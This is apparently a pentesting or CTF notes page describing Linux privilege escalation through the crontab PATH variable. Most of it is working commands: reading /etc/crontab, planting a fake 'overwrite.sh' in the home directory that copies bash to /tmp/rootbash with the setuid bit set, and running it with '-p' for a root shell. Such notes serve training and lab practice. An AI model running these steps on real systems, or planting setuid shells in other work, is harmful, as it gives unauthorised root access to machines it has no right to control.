# PATH Environment Variable

```bash
cat /etc/crontab
```

<figure><img src="../../../../.gitbook/assets/image (2).png" alt=""><figcaption><p>the path is home of the user, so you can have two 'overwrite.sh' file and it will run the first one it found</p></figcaption></figure>

Create a file called overwrite.sh (one of the scheduled programs in the crontab)  in your home directory (this is the chosen path in the file for the PATH variable, so you can use a file in here)  with the following contents:

```bash
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

{% hint style="warning" %}
Make sure that the file is executable:

```bash
chmod +x /home/user/overwrite.sh
```
{% endhint %}

then just run the file you copied (after one period of files);

```bash
/tmp/rootbash -p
```
